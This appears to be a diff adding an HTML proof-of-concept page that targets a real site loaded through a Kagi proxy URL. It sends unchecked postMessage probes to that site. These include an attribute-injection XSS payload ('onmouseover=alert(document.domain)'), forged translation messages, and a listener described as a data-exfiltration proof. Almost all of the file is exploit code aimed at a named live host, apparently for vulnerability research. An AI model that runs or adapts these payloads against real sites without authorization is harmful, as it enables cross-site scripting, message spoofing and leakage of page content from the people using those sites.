@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Kagi Proxy postMessage Test</title>
+</head>
+<body>
+  <h3>postMessage Origin Validation Test</h3>
+  <div id="log" style="font-family:monospace;font-size:13px;border:1px solid #ccc;padding:10px;height:300px;overflow-y:auto"></div>
+
+  <iframe 
+    id="testFrame" 
+    src="https://raw-githack-com-adblock.kagiproxy.com/rahul200218/soundtrackyourbrand.github.io/main/index6.html"
+    style="width:100%;height:400px;border:1px solid red"
+  ></iframe>
+
+  <script>
+    const iframe = document.getElementById('testFrame');
+    const log = document.getElementById('log');
+
+    function logMsg(msg, color) {
+      const el = document.createElement('div');
+      el.style.color = color || '#000';
+      el.textContent = '[' + new Date().toISOString() + '] ' + msg;
+      log.appendChild(el);
+      log.scrollTop = log.scrollHeight;
+    }
+
+    // Listen for any messages coming FROM the iframe
+    window.addEventListener('message', (e) => {
+      logMsg('RECEIVED from iframe: ' + JSON.stringify(e.data), 'blue');
+    });
+
+    iframe.addEventListener('load', () => {
+      logMsg('iframe loaded, running tests...', 'green');
+
+      // Test 1: Scroll — confirms no origin check
+      setTimeout(() => {
+        logMsg('Sending scroll test...', 'gray');
+        iframe.contentWindow.postMessage({
+          type: 'scroll',
+          scrollYProportion: 0.5
+        }, '*');
+      }, 500);
+
+      // Test 2: Language — attribute injection probe
+      setTimeout(() => {
+        const payload = 'en" onmouseover="alert(document.domain)';
+        logMsg('Sending language injection: ' + payload, 'orange');
+        iframe.contentWindow.postMessage({
+          type: 'language',
+          isoCode: payload
+        }, '*');
+      }, 1000);
+
+      // Test 3: Read back the lang attribute to see if payload landed
+      setTimeout(() => {
+        try {
+          const lang = iframe.contentDocument.documentElement.getAttribute('lang');
+          logMsg('lang attribute value: ' + lang, lang.includes('onmouseover') ? 'red' : 'green');
+        } catch(e) {
+          logMsg('Cannot read iframe DOM (cross-origin block): ' + e.message, 'red');
+        }
+      }, 1500);
+
+      // Test 4: Translation ID brute-force — send fake translations
+      setTimeout(() => {
+        for (let id = 0; id < 5; id++) {
+          logMsg('Sending fake translation id=' + id, 'gray');
+          iframe.contentWindow.postMessage({
+            type: 'translation',
+            id: id,
+            translation: 'INJECTED_' + id
+          }, '*');
+        }
+      }, 2000);
+
+      // Test 5: Intercept outgoing translate messages (data exfil proof)
+      logMsg('Listening for translate messages leaking page content...', 'purple');
+    });
+  </script>
+</body>
+</html>
